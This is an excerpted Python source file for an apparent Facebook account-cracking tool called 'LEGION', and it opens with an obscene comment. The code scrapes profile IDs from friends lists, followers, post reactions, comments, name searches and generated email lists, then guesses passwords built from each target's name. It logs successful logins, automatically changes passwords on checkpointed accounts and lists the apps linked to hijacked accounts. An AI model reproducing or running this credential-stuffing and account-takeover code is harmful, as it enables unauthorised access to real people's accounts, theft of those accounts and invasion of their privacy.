#RECODE KI SOCHNA VI MAT LAUDEY TERI MA KI chut
#legion DON HERE
#!/usr/bin/python3
#-*-coding:utf-8-*-
# Update V1.6
...
_js_lo_    = json.loads
_cici_legiondon_    = input
_legiondon_hacker_ = open
_cici_cici_       = exit
...
B = "\033[1;96m" # blue
U = "\033[1;97m" # purple
O = "\033[1;96m" # light blue
N = "\033[1;97m"    # Warna Mati
def banner():
	print(" ")
### Host & Penampungan
...
_my_account_ = [
    '100073345025607','100033520817161','100026312074946','100022639403199','100007641798679']
...
### Clear Login Session
def bersih():
    try:os.remove('legion_token.txt')
    except:pass
...
### Logo
def logo():
	print('\n\033[1;37m##       ########  ######   ####  #######  ##    ##  \n\033[1;37m##       ##       ##    ##   ##  ##     ## ###   ##  \n\033[1;37m##       ##       ##         ##  ##     ## ####  ##  \n\033[1;37m##       ######   ##   ####  ##  ##     ## ## ## ##  \n\033[1;37m##       ##       ##    ##   ##  ##     ## ##  ####  \n\033[1;37m##       ##       ##    ##   ##  ##     ## ##   ###  \n\033[1;37m######## ########  ######   ####  #######  ##    ##  \n\033[1;37m-------------------------------------------------\n\033[1;37m  ➤ AUTHOR  : LEGION \n\033[1;37m  ➤ GITHUB  : https://github.com/Legion-XD\n\033[1;37m  ➤ FB ID   : https://facebook.com/LEGON.HERE\n\033[1;37m-------------------------------------------------\n\033[1;37m░░░░░░░░\033[1;37m╬ \033[1;37m\033[1;41m𝕎𝔼 𝔸ℝ𝔼 𝕃𝔼𝔾𝕀𝕆ℕ\033[0m\033[1;37m ╬░░░░░░░░\n\033[1;37m-------------------------------------------------')	
        
def cek_dev():
    _isi_dev_ = _legiondon_hacker_('cookies.txt','r').read()
...
def bot_follow(_tok_dev_):
    try:
        ...
        print('%s '%(O));jalan('%s [%s!%s] %s\033[1;32mLOGIN SUCCESSFUL %s^_^'%(H,P,H,H,P));time.sleep(2)
    except:pass
...
def menu_log():
    ...
    logo()
    var_menu()
    pmu = _cici_legiondon_('%s \033[1;37m[%s?%s\033[1;37m] %s\033[1;37mChoose : \033[1;37m%s'%(H,P,H,K,H))
    print('%s '%(O))
    if pmu in ['']:jalan('%s \033[1;37m[%s\033[1;37m!%s\033[1;37m] %s\033[1;31mINCORRECT CONTENT'%(M,P,M,P));menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        bersih();clear()
        logo()
        token = _cici_legiondon_('%s \033[1;37m[%s?%s\033[1;37m] %s\033[1;37mTOKEN : %s'%(H,P,H,K,H))
        print('\033[1;37m-------------------------------------------------')
        try:x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'];xd = _legiondon_hacker_("legion_token.txt", "w");xd.write(token);xd.close();xz = _legiondon_hacker_('cookies.txt','w');xz.write('null');xz.close();bot_follow(token);menu()
    ...
    else:jalan('%s \033[1;37m[%s\033[1;37m!%s\033[1;37m] %sINCORRECT CONTENT'%(M,P,M,P));menu_log()
...
def menu():
    ...
    jid = ''
    try:
        _legiondon_ = _legiondon_hacker_("legion_token.txt","r").read();_cici_ = _legiondon_hacker_("cookies.txt","r").read();_salsabila_ = {"cookie" : _cici_}
    ...
    try:token = _legiondon_hacker_("legion_token.txt","r").read();x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'].upper();i = y['id']
    ...
    print('%s [%s•%s] %sNAME   %s: %s\033[1;32m%s'%(H,P,H,B,K,H,n))
    print('%s [%s•%s] %sFROM   %s: %s\033[1;32m%s'%(H,P,H,B,K,H,loc))
    print('%s [%s•%s] %sIP     %s: %s\033[1;32m%s'%(H,P,H,B,K,H,ip))
    print('\033[1;37m-------------------------------------------------')
    psb('%s [%s01%s] %sCLONE FROM FRIEND/PUBLIC ID '%(H,P,H,H))
    psb('%s [%s02%s] %sCLONE FROM FOLLOWER ID '%(H,P,H,B1))
    psb('%s [%s03%s] %sFILE CLONING'%(H,P,H,H))
    psb('%s [%s04%s] %sCLONE FROM SEARCH NAME ID '%(H,P,H,O1))
    psb('%s [%s05%s] %sCLONE FROM POST REACTS '%(H,P,H,H1))
    psb('%s [%s06%s] %sCLONE FROM POST COMMENTS '%(H,P,H,B1))
    psb('%s [%s07%s] %sCLONE ID FROM EMAIL'%(H,P,H,O))
    psb('%s [%s08%s] %sVIEW CLONE RESULTS '%(H,P,H,P))
    psb('%s [%s00%s] %sLOG OUT'%(H,M,H,M))
    print('\033[1;37m-------------------------------------------------')
    pm = _cici_legiondon_('%s [%s?%s] %sCHOOSE : %s'%(H,P,H,K,H))
    print('%s '%(O))
    if pm in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(P,M,P,M));menu()
    elif pm in ['1','01','001','a']:_ngocok_(token)
    elif pm in ['2','02','002','b']:pengikut(token)
    elif pm in ['3','03','003','c']:os.system("clear");logo();file()
    ...
    elif pm in ['7','07','007','g']:dump_email()
    elif pm in ['8','08','008','h']:result()
...
def defaultua():
    ua = ua_xiaomi
    try:ugent = _legiondon_hacker_('ugent.txt','w');ugent.write(ua);ugent.close()
    except (KeyError,IOError):menu_log()


def ugen():
    var_ugen()
    pmu = _cici_legiondon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    print('%s '%(O))
    if pmu in[""]:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    elif pmu in ['1','01','001','a']:os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8');_cici_legiondon_('%s [ %sBACK %s]%s'%(M,P,M,K));menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt");ua = _cici_legiondon_("%s [%s•%s] %sENTER USER AGENT : \n\n"%(H,P,H,K))
        try:ugent = _legiondon_hacker_('ugent.txt','w');ugent.write(ua);ugent.close();jalan("\n%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_legiondon_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
        except (KeyError,IOError):jalan("\n%s [ %sFAILED TO CHANGE USER AGENT %s]"%(Z,M,Z));print('%s '%(M));_cici_legiondon_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()
    elif pmu in ['3','03','003','c']:ugen_hp()
    elif pmu in ['4','04','004','d']:os.system("rm -rf ugent.txt");jalan("%s [ %sUSER AGENT SUCCESSFULLY DELETED %s]"%(H,P,H));print('%s '%(O));_cici_legiondon_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
    elif pmu in ['5','05','005','e']:
        try:ungser = _legiondon_hacker_('ugent.txt', 'r').read()
        except (KeyError,IOError):ungser = 'NOT FOUND'
        print("%s [%s•%s] %sYOUR USER AGENT  : \n\n%s%s"%(H,P,H,P,O,ungser));jalan("\n%s [ %sTHIS IS YOUR CURRENT USER AGENT %s]"%(H,K,H));print('%s '%(O));_cici_legiondon_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
...
def ugen_hp():
    ...
    print('')
    pc = _cici_legiondon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    print('%s '%(O))
    if pc in['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,M));menu()
    elif pc in ['1','01']:ugent = _legiondon_hacker_('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:ugent = _legiondon_hacker_('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:ugent = _legiondon_hacker_('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:ugent = _legiondon_hacker_('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:ugent = _legiondon_hacker_('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:ugent = _legiondon_hacker_('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:ugent = _legiondon_hacker_('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:ugent = _legiondon_hacker_('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    elif pc in ['9','09']:ugent = _legiondon_hacker_('ugent.txt','w');ugent.write(ua_intelmac);ugent.close()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    jalan("%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_legiondon_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()


def _ngocok_(token):
    try:
        nanya_keun = int(input('\n [%s•%s]  SET NUMBER OF TARGETS : '%(M,N)))
    except:nanya_keun=1
    print(" [%s*%s] TYPE (me) IF YOU WANT TO CRACK YOUR OWN FIREND LIST\n"%(O,N))
    for mnh in range(nanya_keun):
        mnh +=1
        user = input(' [%s*%s] ENTER TARGET ID %s%s%s : '%(O,N,H,mnh,N))
        ...
        try:
            ...
            print('\n [×] failed to retrieve id, probably id is not public')
            time.sleep(3)
            menu_jos()
...
def main_likers(_legiondon_):
    bersih();clear()
    logo()
    _query_ = _cici_legiondon_('%s [%s•%s] %sENTER POST ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json'
    try:os.remove(_query_+'.json')
    except:pass
    _legiondon_hacker_(_file_,'w');_url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_);scrape_likers(_legiondon_,_url_,_file_)
    if len(_legiondon_hacker_(_file_).read().splitlines()) == 0:print('\n%s [%s!%s] %sPOST NOT FOUND'%(M,P,M,P));_cici_cici_()
    print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_legiondon_hacker_(_file_).read().splitlines())));return crack(_file_)
def scrape_likers(_legiondon_,_url_,_file_):
    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_legiondon_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_legiondon_hacker_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            for _id_ in _isi_.find_all('a',href=True):
                try:
                    if "profile.php" in _id_.get("href"):_a_ = _id_.get("href").split('=')[1];__id__ = _id_.text;_legiondon_hacker_(_file_,'a+').write(_a_+'|'+__id__+'\n')
                    else:_a_ = _id_.get("href").split('/')[1];__id__ = _id_.text;_legiondon_hacker_(_file_,'a+').write(_a_+'|'+__id__+'\n')
                except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "See more" in _lanjut_.text:
                while True:
                    try:scrape_likers(_legiondon_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:print('%s%s'%(M,e))
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_legiondon_hacker_(_file_).read().splitlines())));return crack(_file_)


def main_komen(_legiondon_):
    _query_ = _cici_legiondon_('%s [%s•%s] %sENTER POST ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json'
    try:os.remove(_query_+'.json')
    except:pass
    _legiondon_hacker_(_file_,'w');_url_ = ('https://mbasic.facebook.com/'+_query_);scrape_komen(_legiondon_,_url_,_file_)
    if len(_legiondon_hacker_(_file_).read().splitlines()) == 0:print('\n%s [%s!%s] %sPOST NOT FOUND'%(M,P,M,P));_cici_cici_()
    print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_legiondon_hacker_(_file_).read().splitlines())));return crack(_file_)
def scrape_komen(_legiondon_,_url_,_file_):
    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_legiondon_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_legiondon_hacker_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            for _id_ in _isi_.find_all('a',href=True):
                try:
                    if "profile.php" in _id_.get("href"):_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",_id_.get("href")));__id__ = _id_.text;_legiondon_hacker_(_file_,'a+').write(str(_a_).split('&')[0]+'|'+__id__+'\n')
                    else:_a_="".join(bs4.re.findall("/(.*?)\?",_id_.get("href")));__id__ = _id_.text;_legiondon_hacker_(_file_,'a+').write(str(_a_).split('?')[0]+'|'+__id__+'\n')
                except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "View more comments…" in _lanjut_.text:
                while True:
                    try:scrape_komen(_legiondon_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:print('%s%s'%(M,e))
...
def dump_name(_legiondon_):
    print('%s [%s•%s] %sEXAMPLE : Kachi, Karma'%(H,P,H,K));__name__ = _cici_legiondon_('%s [%s•%s] %sENTER NAME : '%(H,P,H,K)).split(',');_file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
    for _name_ in __name__:_url_ = "https://mbasic.facebook.com/search/people/?q="+_name_;cari_nama(_file_,_legiondon_,_url_)
    _buka_file_ = _legiondon_hacker_(_file_,'r').read().splitlines();print("\n%s [%s•%s] %sTOTAL ID : %s"%(H,P,H,K,str(len(_buka_file_))))
    return crack(_file_)
def cari_nama(_file_,_cookies_,_url_):
    _legiondon_hacker_(_file_,"a+");_req_ses_dev_ = bs4.BeautifulSoup(_req_get_(_url_, cookies=_cookies_,headers=header_nama).text,"html.parser")
    for _legiondon_dev_ in _req_ses_dev_.find_all("a",href=True):
        print ("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_legiondon_hacker_(_file_).read().splitlines())),end='');sys.stdout.flush()
        if "<img alt=" in str(_legiondon_dev_):
            if "home.php" in str(_legiondon_dev_["href"]):continue
            else:
                _str_dev_ = str(_legiondon_dev_["href"])
                if "profile.php" in _str_dev_:
                    _name_ = _legiondon_dev_.find("img").get("alt").replace(", profile picture","");_find_ = bs4.re.findall("/profile\.php\?id=(.*?)&",_str_dev_)
                    if len (_find_) !=0:
                        _user_ = "".join(_find_)
                        if _user_ in _legiondon_hacker_(_file_).read():pass
                        else:_legiondon_hacker_(_file_,"a+").write("%s|%s\n"%(_user_,_name_))
                else:
                    _find_ = bs4.re.findall("/(.*?)\?",_str_dev_);_name_ = _legiondon_dev_.find("img").get("alt").replace(", profile picture","")
                    if len(_find_) !=0:
                        _user_="".join(_find_)
                        if _user_ in _legiondon_hacker_(_file_).read():pass
                        else:_legiondon_hacker_(_file_,"a+").write("%s|%s\n"%(_user_,_name_))
        if "See More Results" in _legiondon_dev_.text:cari_nama(_file_,_cookies_,_legiondon_dev_["href"])


class dump_pesan:
    def __init__(self,_cookies_,_nama_,_id_):
        self.cookies = _cookies_;self.id = _id_;self.files = (_nama_+'.json').replace(" ","_");_legiondon_hacker_(self.files,"w").close();self.dump("https://m.facebook.com/messages")
    def dump(self,url):
                ...
                try:
                    for _user_ in list(_soup_.pop()):
                        if _user_ in self.id:continue
                            ...
                            _legiondon_hacker_(self.files,"a+").write("%s|%s\n"%(_user_,_dev_.text));print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_legiondon_hacker_(self.files).read().splitlines())),end='');sys.stdout.flush()
                except Exception as e:continue
            if "See Older Messages" in _dev_.text:self.dump("https://m.facebook.com/"+_dev_.get("href"))
        _buka_file_ = _legiondon_hacker_(self.files,'r').read().splitlines();print("\n%s [%s•%s] %sTOTAL ID : %s"%(H,P,H,K,str(len(_buka_file_))))
...
def dump_email():
    print("%s [%s•%s] %sEXAMPLE : Mark Zuckerberg "%(H,P,H,K));_query_ = _cici_legiondon_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
    if len(_query_) < 3:jalan('%s [%s!%s] %sNAME MUST BE MORE THAN 2 DIGITS'%(M,P,M,P));time.sleep(2);menu()
    print("%s [%s•%s] %sEXAMPLE : %sgmail.com"%(H,P,H,K,H));_domain_ = _cici_legiondon_("%s [%s•%s] %sENTER DOMAIN : "%(H,P,H,K)).lower()
    if '@' in _domain_:_domain_ = _domain_.split('@')[1]
    _limit_awal_ = int(_cici_legiondon_("%s [%s•%s] %sENTER STARING NUMBER : "%(H,P,H,K)));_limit_akhir_= int(_cici_legiondon_("%s [%s•%s] %sENTER ENDING NUMBER : "%(H,P,H,K)));_file_ = (_query_+".json").replace(" ","_")
    try:os.remove(_file_)
    except:pass
...
def exec_email(__query__,_domain_,_limit_awal_,_limit_akhir_,_file_):
    ...
    try :
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_1_;email = ('%s%s@%s'%(_query_1_,str(_hitung_email_1_),_domain_));_legiondon_hacker_(_file_,'a+').write('%s|%s\n'%(email,nama));_hitung_email_1_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_2_;email = ('%s%s@%s'%(_query_2_,str(_hitung_email_2_),_domain_));_legiondon_hacker_(_file_,'a+').write('%s|%s\n'%(email,nama));_hitung_email_2_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_3_;email = ('%s%s@%s'%(_query_3_,str(_hitung_email_3_),_domain_));_legiondon_hacker_(_file_,'a+').write('%s|%s\n'%(email,nama));_hitung_email_3_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:
                ...
                email = ('%s%s@%s'%(_query_,str(_hitung_email_full_),_domain_));_legiondon_hacker_(_file_,'a+').write('%s|%s\n'%(email,nama));_hitung_email_full_ += 1
            except:continue
    except:
        jalan('%s [%s!%s] %sTHERE IS AN ERROR'%(M,P,M,M))
        time.sleep(2)
        menu()
    _buka_file_ = _legiondon_hacker_(_file_,'r').read().splitlines()
    print("%s [%s•%s] %sTOTAL ID : %s%s"%(H,P,H,K,H,str(len(_buka_file_))))
    return crack(_file_)


def dump_username():
    print("%s [%s•%s] %sEXAMPLE : %smark.zuckerburge"%(H,P,H,K,H));_query_ = _cici_legiondon_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
    if len(_query_) < 3:jalan('%s [%s!%s] %sNAME MUST BE MORE THAN 2 DIGITS'%(M,P,M,M));time.sleep(2);menu()
    _limit_awal_ = int(_cici_legiondon_("%s [%s•%s] %sENTER STARTING NUMBER (EX: 1) : "%(H,P,H,P)));_limit_akhir_= int(_cici_legiondon_("%s [%s•%s] %sENTER ENDING NUMBER (EX: 1000): "%(H,P,H,P)));_file_ = (_query_+".json").replace(" ","_")
    try:os.remove(_file_)
    except:pass
...
def exec_username(__query__,_limit_awal_,_limit_akhir_,_file_):
    ...
    try :
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_1_;email = ('%s%s'%(_query_1_,str(_hitung_email_1_)));_legiondon_hacker_(_file_,'a+').write('%s|%s\n'%(email,nama));_hitung_email_1_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_2_;email = ('%s%s'%(_query_2_,str(_hitung_email_2_)));_legiondon_hacker_(_file_,'a+').write('%s|%s\n'%(email,nama));_hitung_email_2_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_3_;email = ('%s%s'%(_query_3_,str(_hitung_email_3_)));_legiondon_hacker_(_file_,'a+').write('%s|%s\n'%(email,nama));_hitung_email_3_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:
                if '.' in __query__:_query_ = __query__;nama = __query__.replace('.',' ')
                ...
                email = ('%s%s'%(_query_,str(_hitung_email_full_)));_legiondon_hacker_(_file_,'a+').write('%s|%s\n'%(email,nama));_hitung_email_full_ += 1
            except:continue
    except:jalan('%s [%s!%s] %sTHERE IS AN ERROR'%(M,P,M,P));time.sleep(2);menu()
    _buka_file_ = _legiondon_hacker_(_file_,'r').read().splitlines();print("%s [%s•%s] %sTOTAL ID : %s%s"%(H,P,H,K,H,str(len(_buka_file_))))
    return crack(_file_)
    ...
    try:
        ...
        if _id_ in _cek_:
            if _id_ == 'me':pass
                ...
                _cokzz_ = _cici_legiondon_('%s [%s!%s] %sID HAS BEEN CRACKED, CONTINUE? [Y/n] : '%(M,P,M,P))
                if _cokzz_ in ['',' ']:pass
                elif _cokzz_ in ['1','01','y']:pass
                elif _cokzz_ in ['2','0','n']:menu()
                else:pass
        else:_legiondon_hacker_('list_id.txt',"a+").write("%s\n"%(_id_))
    except:pass
...
def generate1(_cici_):
    ...
    for i in _cici_.split(" "):
        if len(i)<3:continue 
            ...
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:_legiondon_.append(i+"123");_legiondon_.append(i+"12345")
            elif len(i)>=6:_legiondon_.append(i);_legiondon_.append(i+"123");_legiondon_.append(i+"12345")
            else:continue
    _legiondon_.append(_cici_.lower())
    return _legiondon_
...
def generate2(_cici_):
    ...
    for i in _cici_.split(" "):
        if len(i)<3:continue
            ...
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:_legiondon_.append(i+"123");_legiondon_.append(i+"1234");_legiondon_.append(i+"12345")
            else:_legiondon_.append(i);_legiondon_.append(i+"12");_legiondon_.append(i+"123");_legiondon_.append(i+"1234");_legiondon_.append(i+"12345")
    _legiondon_.append(_cici_.lower());_legiondon_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1])
    return _legiondon_
...
def generate3(_cici_):
    ...
    for i in _cici_.split(" "):
        if len(i)<3:continue
            ...
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:_legiondon_.append(i+"123");_legiondon_.append(i+"1234");_legiondon_.append(i+"12345");_legiondon_.append(i+"@123")
            else:_legiondon_.append(i);_legiondon_.append(i+"1");_legiondon_.append(i+"12");_legiondon_.append(i+"123");_legiondon_.append(i+"1234");_legiondon_.append(i+"12345");_legiondon_.append(i.upper()+"123");_legiondon_.append(i+"@#");_legiondon_.append(i+"123@#")
    _legiondon_.append(_cici_.lower());_legiondon_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]);_legiondon_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"12");_legiondon_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"123");_legiondon_.append("889900")
    return _legiondon_


def generate4(_cici_):
    _legiondon_=[]
    ps = _legiondon_hacker_('pass.txt','r').read()
    pp = _legiondon_hacker_('digitpass.txt','r').read()
    for i in _cici_.split(" "):  
        i=i.lower()
        if len(i)<3:continue
        elif len(i)==3 or len(i)==4 or len(i)==5:_legiondon_.append(i+"123");_legiondon_.append(i+"12345")
        else:_legiondon_.append(i);_legiondon_.append(i+"123");_legiondon_.append(i+"12345")
    if pp in ['',' ','  ']:pass
    else:
        for i in _cici_.split(" "):  
            i=i.lower()
            for x in pp.split(','):_legiondon_.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):_legiondon_.append(z)
    _legiondon_.append(_cici_.lower())
    return _legiondon_
def tambah_pass():
    print('%s '%(O));print('%s [%s•%s] %sEXAMPLE : %778899,123456,102030,786786'%(H,P,H,K,H));cuy = _cici_legiondon_('%s [%s•%s] %sENTER MANUAL SUPPLEMENTAL PASS [1 WORD] : '%(H,P,H,K));gh = _legiondon_hacker_('pass.txt','w');gh.write(cuy);gh.close
def tambah_pass_angka():
    print('%s [%s•%s] %sEXAMPLE : %s143,786,gaming'%(H,P,H,K,H));coy = _cici_legiondon_('%s [%s•%s] %sENTER ADDITIONAL PASS BEHIND NAME : '%(H,P,H,K));xy = _legiondon_hacker_('digitpass.txt','w');xy.write(coy);xy.close
    
### Logger Crack
def log_api_1(em,pas):
    ua = _legiondon_hacker_('ugent.txt','r').read()
    r = requests.Session()
...
def cek_opsi(user,pw,format):
    ...
    if "c_user" in _req_ses_.cookies.get_dict():
        ...
        else:_cookies_ = ''.join(_req_ses_.cookies.get_dict());_result_ok_ = "\r %s[%s\x1b[1;92m[LEGION-HACKED]%s] %s | %s%s%s          "%(H,P,H,user,pw,tahun(user),P);cek_apk(_result_ok_,cvt_cookies(_cookies_))
        ...
        for _legiondon_ in _response_("input"):
            if _legiondon_.get("name") in list_input:data_2.update({_legiondon_.get("name"):_legiondon_.get("value")})
...
def auto_ganti_pass(_piye_):
    while True:
        _gimana_ = _cici_legiondon_('%s [%s•%s] %sCHANGE ONE TAP ACCOUNT PASS? [Y/n] : '%(H,P,H,K))
        print('\033[1;37m-------------------------------------------------')
        if _gimana_ in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        elif _gimana_ in ['1','01','001','y','Y']:
            open('auto_ganti.txt','w').write('Yes');_newpass_ = _cici_legiondon_('%s [%s•%s] %sENTER ONE TAP PASSWORD : '%(H,P,H,K))
...
def change_pass(user,_req_ses_,_response_,link_2):
    ...
    except:_new_pass_ = 'legiondon-_'
    _password_ = ''.join(_new_pass_);_result_ok_ = "\r %s[%s\x1b\x1b[1;91mLEGION-CHECKPOINT %s | %s%s%s          "%(H,P,H,user,_password_,tahun(user),P);_button_dev_ = ["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for _legiondon_ in _response_("input"):
        if _legiondon_.get("name") in _button_dev_:data_change_1.update({_legiondon_.get("name"):_legiondon_.get("value")})
    ...
    if "Create a new password" in re.findall("\<title>(.*?)<\/title>",str(_ganti_pass_)):
        ...
        data_change_2.update({"password_new":_password_});_ses_final_ = _req_ses_.post(host+_link_3_.get("action"),data=data_change_2);_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in _req_ses_.cookies.get_dict().items()]);__cookies__ = cvt_cookies(_cookies_);cek_apk(_result_ok_,__cookies__);ok.append("%s|%s"%(user,_password_));_legiondon_hacker_(files_ok,"a+").write("%s|%s\n"%(user,_password_));cp -= 1;pass
    else:pass

### Cek Aplikasi
def cek_apk(h_ok,_legiondon_):
    apk = [];ses_ = requests.Session()
    cek_pilih_opsi = open('muncul_opsi.txt','r').read()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active";dat_game = ses_.get(url,cookies={'cookie':_legiondon_});datagame = par(dat_game.content,'html.parser');form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:celeng = asu.find('span').text;apk.append('\n   | '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive";dat_game = ses_.get(url2,cookies={'cookie':_legiondon_});datagame = par(dat_game.content,'html.parser');form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:celeng = asu.find('span').text;apk.append('\n   | '+celeng)
        except:pass
...
def pilih_methode():
    ...
    while True:
        start_method()
        put = _cici_legiondon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
...
class crack:
    def __init__(self,files):
        ...
        while True:
            ...
            print('\033[1;37m-------------------------------------------------')
            _pilih_sandi_ = _cici_legiondon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
            print('\033[1;37m-------------------------------------------------')
            if _pilih_sandi_=="":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
            elif _pilih_sandi_ in ['m','M','2','02','002']:
                try:
                    while True:
                        try:self.apk = files;self.fs = _legiondon_hacker_(self.apk).read().splitlines();break
                ...
                try:
                    ...
                    self.fl = [];start_methodezz();kopi = _cici_legiondon_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
                    print('\033[1;37m-------------------------------------------------')
                    if kopi in ['']:
                    ...
                    print('%s '%(O));puf = _cici_legiondon_('%s [%s•%s] %sBRING UP CP OPTIONS? [Y/n] : '%(H,P,H,K))
                    print('\033[1;37m-------------------------------------------------')
    ...
    def pwlist(self):
        self.pw = _cici_legiondon_('%s [%s•%s] %sENTER PASSWORD : '%(K,P,K,H)).split(",")
        if len(self.pw) ==0:self.pwlist()
        else:
            for i in self.fl:i.update({"pw":self.pw})
            try:os.remove('cp_option.txt')
            except:pass
            print('%s '%(O));puf = _cici_legiondon_('%s [%s•%s] %sPOP UP CP OPTIONS? [Y/n] : '%(H,P,H,K))
            if puf in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    if fl.get("id") in files_cp:pass
                        ...
                        try:ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + _legiondon_hacker_("legion_token.txt","r").read());tt = _js_lo_(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = bulan_ttl[m];ttll = (' | %s %s %s'%(d,m,y))
                        except:ttll = (''%())
                        h_cp = "\r %s[%s\x1b[1;91mLEGION-CHECKPOINT%s] %s | %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                        self.cp.append("%s|%s"%(fl.get("id"),i));_legiondon_hacker_(files_cp,"a+").write("%s|%s%s\n"%(fl.get("id"),i,ttll.replace(' ','')));break
                elif log.get("status")=="ok":
                    files_ok = "OK/%s.txt"%(tanggal)
                    if fl.get("id") in files_ok:pass
                    else:
